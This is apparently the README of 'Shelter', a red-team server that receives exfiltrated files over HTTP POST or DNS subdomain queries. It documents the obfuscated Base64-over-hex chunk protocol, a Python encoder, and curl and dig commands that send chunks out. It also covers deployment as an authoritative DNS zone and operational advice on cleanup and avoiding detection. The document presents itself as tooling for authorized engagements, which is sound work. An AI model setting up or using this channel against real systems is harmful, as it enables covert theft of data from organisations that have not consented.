# Shelter - Red Team Exfiltration Toolkit

## Main Objective

**Shelter** is a specialized server-side receiver designed for Red Team engagements involving data exfiltration phases. It accepts encoded file portions from remote agents via HTTP or DNS transport, assembles them in-memory using deterministic ordering, and persists reconstructed files to disk.

### Key Capabilities

- **Dual Transport Support**: HTTP POST and DNS subdomain-based exfiltration channels
- **In-Memory File Assembly**: Uses BTreeMap-based indexing for deterministic chunk ordering and reassembly
- **Nested Encoding Support**: Handles Base64(Hex(colon-delimited-fields)) encoding scheme for payload obfuscation
- **Asynchronous Architecture**: Non-blocking reception and background processing via Tokio MPSC channels
- **Flexible Deployment**: Configurable listen addresses, protocols, and output directories
- **Error Resilience**: Comprehensive error handling with detailed logging at all pipeline stages
- **Protocol Compliance**: Full DNS protocol support with authoritative zone handling and HTTP standards compliance

---

## Disclaimer

⚠️ **LEGAL NOTICE**

This toolkit is provided **exclusively for authorized Red Team engagements and legitimate security research purposes**. 

**Before using this toolkit:**
- Obtain **explicit written authorization** from the system owner or authorized representative
- Verify compliance with all applicable laws and regulations in your jurisdiction
- Ensure adherence to responsible disclosure practices
- Document all authorized security activities and obtain proper approvals
- Understand that unauthorized access to computer systems and data exfiltration are **illegal** in most jurisdictions

**Operational Security Considerations:**
- The HTTP server creates visible network artifacts on the configured interface
- All file operations are logged at INFO level; review logs before departing the engagement
- DNS queries may be monitored by defenders or logged by recursive resolvers
- Ensure complete cleanup of the loot directory and any temporary files upon completion
- Be aware of potential file system artifacts from the Rust/Tokio runtime

**Legal Liability:**
The authors and contributors assume **no liability** for misuse, unauthorized access, data loss, system damage, or legal consequences arising from the use of this toolkit.

---

## No Warranty

This software is provided **"as is"** without any warranty of any kind, whether express or implied, including but not limited to:
- Merchantability or fitness for a particular purpose
- Non-infringement of third-party intellectual property rights
- Compatibility with specific systems or environments
- Data integrity or successful exfiltration

Users assume all risks associated with the use of this software. The authors disclaim all liability for damages, data loss, system failures, or any other consequences resulting from its use.

---

## Commands Available

### Global Options

```bash
shelter [OPTIONS] <COMMAND>
```

**Global Arguments:**
- `--output-dir <PATH>` — Directory where reconstructed files are stored (default: `loot`)

### HTTP Server Subcommand

```bash
shelter http-server [OPTIONS]
```

Launch an Actix-web based HTTP server for receiving exfiltrated file portions.

**Options:**
- `-l, --listen <ADDRESS>` — HTTP server bind address in `host:port` format (default: `127.0.0.1:8080`)
- `--output-dir <PATH>` — Loot directory path (default: `loot`)

**Examples:**

```bash
# Listen on localhost, port 8080 (default)
cargo run -- http-server

# Listen on all interfaces, custom port and output directory
cargo run -- http-server -l 0.0.0.0:9000 --output-dir /var/exfil

# Listen on specific interface
cargo run -- http-server -l 192.168.1.100:8080
```

### DNS Server Subcommand

```bash
shelter dns-server [OPTIONS]
```

Launch a Hickory-based DNS server for receiving exfiltrated file portions via DNS TXT queries.

**Options:**
- `-p, --protocol <PROTOCOL>` — Transport protocol: `udp` or `tcp` (default: `udp`)
  - `UDP`: Faster, but limited to ~512 bytes per query (unless EDNS0 extension used)
  - `TCP`: Larger MTU available, guaranteed delivery, may be detected more easily
- `-l, --listen <ADDRESS>` — DNS server bind address in `host:port` format (default: `127.0.0.1:1053`)
- `-d, --domain <DOMAIN>` — Root zone domain for exfiltration (default: `runner-shelter.top`)
- `--output-dir <PATH>` — Loot directory path (default: `loot`)

**Examples:**

```bash
# Listen on localhost, UDP, default domain
cargo run -- dns-server

# Listen on all interfaces, TCP protocol, custom domain
cargo run -- dns-server -p tcp -l 0.0.0.0:53 -d exfil.internal

# Custom setup with specific output directory
cargo run -- dns-server -l 127.0.0.1:1053 -d company.exfil --output-dir ./dns-loot
```

---

## Server Information

### HTTP Server Information

#### Endpoints

**POST `/`**

Receives hex-base64 encoded file portions and forwards them to the background assembly handler.

**Request Format:**
- **Method:** `POST`
- **Path:** `/`
- **Content-Type Header:** `text/plain` (required)
- **Body:** Double-encoded string: `Base64(Hex(colon-delimited-fields))`

**Payload Structure:**

The decoded payload (after hex and base64 decoding) follows this format:

**Root Node** (marks the start of file transmission):
```
r:filename:file_id
```
- `r` — Node type identifier (root node)
- `filename` — Original filename of exfiltrated file
- `file_id` — Unique identifier correlating chunks to this root node

**File Chunk** (regular data chunk):
```
f:root_id:chunk_index:hex_encoded_data
```
- `f` — Node type identifier (file chunk)
- `root_id` — References a previously sent root node's file_id
- `chunk_index` — Hexadecimal chunk sequence number (e.g., `0`, `1a`, `2b`)
- `hex_encoded_data` — Hex-encoded file bytes (decoded during assembly)

**End Chunk** (marks end of transmission, triggers assembly):
```
e:root_id:chunk_index:hex_encoded_data
```
- `e` — Node type identifier (end chunk, triggers file assembly)
- All other fields same as file chunk
- When received, background handler assembles all chunks for this root_id and writes the file to disk

**Example Encoding** (Python):

```python
import base64
import binascii

# Step 1: Build the payload
filename = "secret.txt"
file_id = "abc123"
chunk_index = "0"  # hexadecimal index
file_data = binascii.hexlify(b"This is secret data").decode()

# Root node
root_payload = f"r:{filename}:{file_id}"

# File chunk
chunk_payload = f"f:{file_id}:{chunk_index}:{file_data}"

# End chunk (marks transmission complete)
end_payload = f"e:{file_id}:{chunk_index}:{file_data}"

# Step 2: Encode root node
root_hex = binascii.hexlify(base64.b64encode(root_payload.encode())).decode()
print(f"Root: {root_hex}")

# Step 3: Encode chunk
chunk_hex = binascii.hexlify(base64.b64encode(chunk_payload.encode())).decode()
print(f"Chunk: {chunk_hex}")

# Step 4: Encode end marker
end_hex = binascii.hexlify(base64.b64encode(end_payload.encode())).decode()
print(f"End: {end_hex}")
```

**HTTP Request Example:**

```bash
curl -X POST http://127.0.0.1:8080/ \
  -H "Content-Type: text/plain" \
  -d "3665cd5665726f6f743a0d6361636865643a616263313233"
```

#### Error Codes

| Code | Status | Cause | Remediation |
|------|--------|-------|-------------|
| **200** | OK | Payload successfully decoded, parsed, and queued | None; transmission successful |
| **400** | Bad Request | Hex decode failed, Base64 decode failed, UTF-8 conversion error, field parsing error, missing required fields, invalid field values (e.g., non-hex chunk index), unknown node type | Verify payload encoding; check hex and base64 encoding steps; ensure all required fields are present and properly formatted |
| **500** | Internal Server Error | Background processor channel closed or send failed; indicates background event handler task has crashed | Restart the server; check server logs for background processor crash diagnostics |

**Common 400 Errors:**
- **Hex Decode Failed**: Payload contains invalid hex characters (0-9, a-f only)
- **Base64 Decode Failed**: Payload has invalid base64 characters or missing padding
- **UTF-8 Conversion Failed**: Decoded bytes contain invalid UTF-8 sequences
- **Missing Fields**: Payload missing required colon-delimited fields
- **Invalid Chunk Index**: Chunk index field contains non-hexadecimal characters
- **Unknown Node Type**: First field (after colon split) is not 'r', 'f', or 'e'

### DNS Server Information

#### Root Zone Handling

The DNS server acts as an **authoritative** resolver for a configurable root domain. All queries targeting subdomains of the configured domain are processed for exfiltration data extraction.

**Zone Authority:**

For a configured domain `exfil.internal`, the server:
- Is authoritative for `exfil.internal` and all subdomains
- Responds with authoritative (AA) bit set
- Returns NXDOMAIN for queries outside the authoritative zone
- Processes all subdomain queries as potential exfiltration payloads

**Query Format:**

Exfiltration data is transmitted as the **subdomain portion** of a DNS query:

```
<hex_base64_payload>.exfil.internal
```

Examples:
```
72657373656372657400.exfil.internal          (root node)
6631d78616263313233.exfil.internal            (file chunk)
```

**Payload Extraction Pipeline:**

1. **Subdomain Extraction**: Remove the root zone suffix (e.g., `.exfil.internal.`)
2. **Dot Removal**: Strip DNS transport-added dots between labels
3. **Hex Decode**: Convert hex string to bytes
4. **Base64 Decode**: Decode resulting bytes to plaintext
5. **UTF-8 Conversion**: Parse bytes as UTF-8 text
6. **Field Parsing**: Split on colons to extract node type and fields
7. **Channel Send**: Forward parsed Node to background processor
8. **Response**: Return TXT "ACK" record to acknowledge successful receipt

**DNS Query Example:**

```bash
# Linux/macOS using dig
dig @127.0.0.1 -p 1053 72657373656372657400.exfil.internal TXT

# Windows using nslookup
nslookup 72657373656372657400.exfil.internal 127.0.0.1:1053
```

**Protocol Support:**

- **UDP** (default): Faster, lower overhead; limited to ~512 bytes per query
  - Suitable for smaller file chunks
  - May be more noticeable in network logs due to DNS protocol expectations

- **TCP** (optional): Reliable, larger MTU available (~64KB)
  - Better for large chunks
  - May be less common in network traffic and more easily detected
  - Includes 10-second timeout for connection handling

#### Response Codes and Handling

The DNS server uses standard DNS response codes (from RFC 1035):

| Code | Name | Condition | Meaning |
|------|------|-----------|---------|
| **0** | NOERROR | Query processed successfully | Exfiltration payload received, parsed, and queued; TXT "ACK" returned |
| **2** | SERVFAIL | Invalid OpCode, invalid MessageType, decoding error, parsing error, channel failure | Server encountered an error and cannot process the query |
| **3** | NXDOMAIN | Query targets zone not under server authority | Query domain is not a subdomain of the configured root zone |

**Error Scenarios:**

- **Malformed Subdomain** (invalid hex): Returns SERVFAIL; error logged
- **Decode Failure** (invalid base64 in hex result): Returns SERVFAIL; error logged
- **Parse Failure** (missing fields, unknown node type): Returns SERVFAIL; error logged
- **Unknown Domain**: Returns NXDOMAIN; query logged as invalid
- **Invalid OpCode** (not Query): Returns SERVFAIL; unusual request logged
- **Invalid MessageType** (not Query format): Returns SERVFAIL; unusual request logged

**TXT Record Response:**

On successful decoding and queuing, server responds with:
```
<subdomain>.exfil.internal. 60 IN TXT "ACK"
```

TTL is set to 60 seconds; the "ACK" value confirms receipt but is not cryptographically significant.

---

## Installation Steps

### Prerequisites

- **Rust**: Version 1.70 or later ([install from rustup.rs](https://rustup.rs/))
- **Cargo**: Included with Rust installation
- **Build Tools**: C compiler and linker (for Tokio and native dependencies)
  - Linux: `gcc`, `build-essential`
  - macOS: Xcode Command Line Tools (`xcode-select --install`)
  - Windows: Visual Studio Build Tools or equivalent

### Build from Source

```bash
# Navigate to the shelter directory
cd hunk/shelter

# Build in release mode (optimized)
cargo build --release

# Binary location: target/release/shelter
```

### Run Directly (Development)

```bash
# Default HTTP server (localhost:8080, loot directory)
cargo run -- http-server

# HTTP server with custom settings
cargo run -- http-server -l 0.0.0.0:8080 --output-dir ./recovered_files

# DNS server (UDP, localhost:1053)
cargo run -- dns-server

# DNS server with custom settings
cargo run -- dns-server -p tcp -l 0.0.0.0:53 -d exfil.internal
```

### Deploy Compiled Binary

```bash
# Copy the compiled binary to deployment location
cp target/release/shelter /usr/local/bin/

# Create loot directory
mkdir -p /var/exfil

# Run with appropriate permissions (DNS port 53 requires root)
shelter http-server -l 0.0.0.0:8080 --output-dir /var/exfil

# Or run as systemd service (requires service file configuration)
systemctl start shelter-http
```

### Docker Deployment

Create a `Dockerfile`:

```dockerfile
FROM rust:1.75 as builder
WORKDIR /workspace
COPY . .
RUN cargo build --release -p shelter

FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*
COPY --from=builder /workspace/target/release/shelter /usr/local/bin/
WORKDIR /shelter
RUN mkdir -p /shelter/loot
EXPOSE 8080
ENTRYPOINT ["shelter"]
CMD ["http-server", "-l", "0.0.0.0:8080", "--output-dir", "/shelter/loot"]
```

Build and run:

```bash
docker build -t shelter:latest .

# HTTP server
docker run -p 8080:8080 -v shelter-loot:/shelter/loot shelter:latest \
  http-server -l 0.0.0.0:8080 --output-dir /shelter/loot

# DNS server (requires --cap-add NET_BIND_SERVICE for port 53)
docker run --cap-add NET_BIND_SERVICE -p 53:53/udp -v shelter-loot:/shelter/loot shelter:latest \
  dns-server -p udp -l 0.0.0.0:53 -d exfil.internal --output-dir /shelter/loot
```

---

## Architecture Overview

### Exfiltrated Data Structure

Shelter uses a hierarchical node-based architecture to represent exfiltrated data:

#### RootNode

Represents metadata for a complete file transmission.

```rust
pub struct RootNode {
    pub file_name: String,           // Original filename
    pub file_identifier: String,     // Unique ID correlating chunks
}
```

**Purpose:** Marks the beginning of file transmission and provides the target filename for disk persistence.

**Payload Format:** `r:filename:file_id`

#### FileChunkNode

Represents a single chunk of file data within a transmission.

```rust
pub struct FileChunkNode {
    pub root_node_id: String,        // References RootNode file_identifier
    pub index: usize,                // Hex-parsed chunk sequence number
    pub data: Vec<u8>,               // Hex-encoded file bytes (UTF-8 representation)
    pub chunk_type: ChunkType,       // File or End
}

pub enum ChunkType {
    File,                            // Regular data chunk
    End,                             // Final chunk, triggers assembly
}
```

**Purpose:** Carries a portion of the exfiltrated file along with sequencing metadata.

**Payload Format:** 
- File: `f:root_id:chunk_index:hex_data`
- End: `e:root_id:chunk_index:hex_data`

#### Node Enum

Unified representation for root metadata or file data.

```rust
pub enum Node {
    Root(RootNode),
    FileChunk(FileChunkNode),
}
```

### Data Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                      Remote Agent (Runner)                       │
│  Encodes file chunks → Base64(Hex(colon-delimited-fields))      │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────┐
          │   HTTP or DNS Transport      │
          │  (Port 8080 or 53)           │
          └──────────────┬───────────────┘
                         │
                         ▼
        ┌────────────────────────────────────┐
        │  Decoding Pipeline (Sequential)    │
        │                                     │
        │  1. Hex::decode(payload)           │
        │  2. Base64::decode(hex_result)     │
        │  3. UTF-8::from_bytes(b64_result)  │
        │  4. String::split(':')             │
        │                                     │
        │  Result: RootNode or FileChunkNode│
        └────────────────────┬───────────────┘
                             │
                             ▼
            ┌────────────────────────────────┐
            │   Tokio MPSC Channel           │
            │   (transfer_channel, cap=10)   │
            │   [Handles backpressure]       │
            └────────────┬───────────────────┘
                         │
                         ▼
        ┌─────────────────────────────────────┐
        │  Event Handler (Background Task)    │
        │  handle_received_data()             │
        │                                      │
        │  Data Structures:                   │
        │  • HashSet<RootNode>                │
        │  • HashMap<root_id, BTreeMap>       │
        │                                      │
        │  On RootNode: Store in HashSet      │
        │  On FileChunk: Insert to BTreeMap   │
        │  On End Chunk: Trigger Assembly     │
        └────────────────────┬────────────────┘
                             │
                             ▼
        ┌─────────────────────────────────────┐
        │  File Assembly Pipeline             │
        │                                      │
        │  1. Retrieve all chunks by root_id  │
        │  2. Sort by index (BTreeMap)        │
        │  3. Hex::decode each chunk.data     │
        │  4. Concatenate decoded bytes       │
        │  5. fs::write(path, bytes)          │
        │                                      │
        │  Path: loot_dir/filename            │
        └────────────────────┬────────────────┘
                             │
                             ▼
            ┌────────────────────────────────┐
            │  Loot Directory                │
            │  (Reconstructed Files)         │
            │                                 │
            │  /loot/secret.txt              │
            │  /loot/database.dump           │
            │  /loot/config.xml              │
            └────────────────────────────────┘
```

### Key Components

#### Transport Handlers

**HTTP Handler** (`commands/http.rs`)
- Receives POST requests on port 8080 (configurable)
- Guards on `Content-Type: text/plain` header
- Extracts request body as payload string
- Calls `Node::try_from(payload)` for decoding
- Sends parsed Node to `transfer_channel`
- Returns appropriate HTTP status code

**DNS Handler** (`commands/dns.rs`)
- Receives DNS queries targeting configured domain
- Extracts subdomain portion from query name
- Removes DNS transport-added dots
- Calls `Node::try_from(subdomain)` for decoding
- Sends parsed Node to `transfer_channel`
- Returns TXT "ACK" response on success

#### Decoding Pipeline

The `Node::try_from(String)` implementation performs sequential decoding:

```
Input: "3635..." (hex string)
  ↓
Hex::decode() → bytes
  ↓
Base64::decode(bytes) → decoded_bytes
  ↓
String::from_utf8(decoded_bytes) → "r:filename:id"
  ↓
String::split(':') → ['r', 'filename', 'id']
  ↓
Match node_type → RootNode { file_name: "filename", file_identifier: "id" }
  ↓
Output: Node::Root(RootNode)
```

#### Event Handler

The `event_handler::handle_received_data()` function:

1. **Initialization**: Creates HashSet for root nodes and HashMap for chunks
2. **Reception Loop**: Continuously receives Node instances from channel
3. **Root Node Handling**: Stores in HashSet for later correlation
4. **Chunk Handling**:
   - Creates BTreeMap for new root_id if needed
   - Inserts chunk at index (sorted automatically)
   - Logs chunk reception
5. **Assembly Trigger**: On ChunkType::End:
   - Retrieves root node by file_id
   - Retrieves all chunks from BTreeMap (already sorted by index)
   - Hex-decodes each chunk's data field
   - Concatenates decoded bytes
   - Writes to `loot_dir/filename`
   - Removes root and chunks from memory

#### Error Handling

**Error Types:**

- `AppError`: Unified internal error (DecodeError, ConverterError, ParserError, TokioChannelProducerError)
- `HTTPResponseError`: Conversion for HTTP responses (BadRequest, InternalError)
- `DNSError`: Conversion for DNS responses (InvalidOpCode, InvalidZone, InternalError, Io)

**Error Flow:**

```
Node::try_from(payload)
  ├→ Hex::decode() → DecodeError("hex", msg)
  ├→ Base64::decode() → DecodeError("base64", msg)
  ├→ UTF-8::from_utf8() → ConverterError("utf8", msg)
  ├→ Field parsing → ParserError("payload_node", msg)
  └→ Integer parsing → ParserError("int", msg)

transfer_channel.send(node)
  └→ TokioChannelProducerError(msg)

HTTP Handler converts AppError:
  ├→ DecodeError/ConverterError/ParserError → HTTP 400
  └→ TokioChannelProducerError → HTTP 500

DNS Handler converts AppError:
  ├→ DecodeError/ConverterError/ParserError → SERVFAIL
  └→ TokioChannelProducerError → SERVFAIL
```

**Logging:**

All errors are logged at ERROR level with context:
- Decoding stage and failure reason
- Transport protocol and source address (DNS)
- Parsing errors with invalid field information

### Concurrency Model

Shelter uses a **producer-consumer** pattern:

**Producers** (HTTP/DNS handlers):
- Run in Actix/Tokio thread pools
- Decode payloads synchronously
- Send Node to channel (may await if channel full)
- Quickly return to accept next request

**Consumer** (event_handler):
- Spawned as dedicated Tokio task at startup
- Runs concurrently with producers
- Continuously receives from channel
- Performs in-memory assembly and disk I/O
- Naturally handles backpressure when receiving overwhelms assembly

**Channel:**
- Bounded MPSC with capacity of 10 Nodes
- Serializes access to file assembly state
- Ensures deterministic file reconstruction order

---

## TODO List

### High Priority

- [ ] **Configuration File Support**: Implement `.toml` or `.json` configuration file parsing with clear precedence rules (CLI args > config file > defaults)
- [ ] **Dead-Letter Queue (DLQ)**: Create a persistent or in-memory queue for file portions that fail parsing/channel send to prevent silent data loss
- [ ] **Circuit Breaker Pattern**: Implement circuit breaker in event_handler loop to prevent infinite retries on persistent failures (e.g., disk full, permission denied)
- [ ] **Unit & Integration Tests**: Comprehensive test suite covering:
  - Payload encoding/decoding (Root nodes, File chunks, End chunks)
  - File reassembly with out-of-order chunks
  - Error handling for malformed payloads
  - Channel backpressure and capacity limits
  - HTTP and DNS handlers with mocked transports

### Medium Priority

- [ ] **TLS/HTTPS Support**: Enable encrypted transport with configurable certificate paths and optional client certificate validation
- [ ] **DNS EDNS0 Extension Support**: Handle EDNS0 to increase DNS payload size beyond 512 bytes, improving throughput
- [ ] **Authentication & Authorization**: Add API key, mutual TLS, or basic auth to restrict access to authorized agents only
- [ ] **Metrics & Monitoring**: Export Prometheus metrics for:
  - Number of files completed
  - Number of chunks received and reassembled
  - Error rates by type
  - Channel capacity utilization
  - Assembly latency percentiles
- [ ] **Metrics Dashboard**: Grafana dashboard for real-time monitoring of exfiltration progress

### Medium Priority (Continued)

- [ ] **Resume Capability**: Persist metadata of received chunks to allow resumption of interrupted transfers (graceful recovery)
- [ ] **Batch Processing**: Support receiving multiple files in parallel with configurable concurrency limits to prevent memory exhaustion
- [ ] **Compression Support**: Add optional gzip/deflate decompression for payload optimization and reduced network footprint
- [ ] **Checksum Verification**: Add optional MD5/SHA256 checksums in payload to verify file integrity post-reassembly

### Lower Priority

- [ ] **Logging Rotation**: Implement log rotation and archival to prevent unbounded disk space usage
- [ ] **Cleanup Automation**: Implement automatic cleanup of loot directory after configurable retention period
- [ ] **WebUI Dashboard**: Browser-based UI for:
  - Viewing received files and reassembly progress
  - Downloading reconstructed files
  - Viewing real-time logs
  - Server statistics and metrics
- [ ] **Multi-Zone DNS Support**: Support exfiltration across multiple DNS zones with per-zone configuration
- [ ] **Rate Limiting**: Implement per-source rate limiting to prevent DoS from agents or scanning
- [ ] **IPv6 Support**: Ensure full IPv6 compatibility for both HTTP and DNS transports

### Research & Enhancement

- [ ] **Covert Channel Analysis**: Document detection signatures and evasion techniques for each transport
- [ ] **Performance Benchmarks**: Establish baseline performance metrics (chunks/sec, MB/sec throughput, latency percentiles)
- [ ] **Security Audit**: Conduct formal security review focusing on:
  - Input validation and injection prevention
  - Resource exhaustion prevention (memory, file descriptors)
  - Timing attack resistance
  - Error message information leakage
- [ ] **Documentation**: Expand with:
  - Operational playbooks for common scenarios
  - Troubleshooting guide for common failures
  - Network signature analysis for detection avoidance
  - Integration examples with Runner agent

---

## Quick Reference

### Command Summary

| Transport | Command | Default Address | Default Port |
|-----------|---------|-----------------|--------------|
| HTTP | `http-server` | 127.0.0.1 | 8080 |
| DNS | `dns-server` | 127.0.0.1 | 1053 |

### Payload Encoding Checklist

For remote agents encoding payloads:

1. [ ] Prepare root node: `r:filename:file_id`
2. [ ] Prepare file chunks: `f:file_id:chunk_index:hex_data` (chunk_index in hex)
3. [ ] Prepare end chunk: `e:file_id:last_index:hex_data`
4. [ ] Base64 encode each payload string
5. [ ] Hex encode the base64 result
6. [ ] Send via HTTP POST or DNS subdomain

### Troubleshooting

| Symptom | Cause | Solution |
|---------|-------|----------|
| HTTP 400 Bad Request | Malformed payload | Verify hex and base64 encoding; check field format |
| HTTP 500 Internal Server Error | Background handler crashed | Restart shelter; check logs for panic/error messages |
| DNS SERVFAIL | Decoding error or invalid opcode | Verify subdomain format; check server logs |
| DNS NXDOMAIN | Query targets wrong domain | Verify domain matches server configuration |
| Files not appearing in loot directory | Chunks missing or root node missing | Ensure all chunks sent before end chunk; verify file_id correlation |

### Logging

Set the `RUST_LOG` environment variable to control logging verbosity:

```bash
# Default (info level)
RUST_LOG=info shelter http-server

# Debug level (detailed)
RUST_LOG=debug shelter http-server

# Trace level (extremely verbose)
RUST_LOG=trace shelter http-server

# Module-specific
RUST_LOG=shelter=debug,actix_web=info shelter http-server
```

---

**Version:** 0.1.0  
**Language:** Rust  
**Edition:** 2021  
**Status:** Active Development  
**Last Updated:** 2024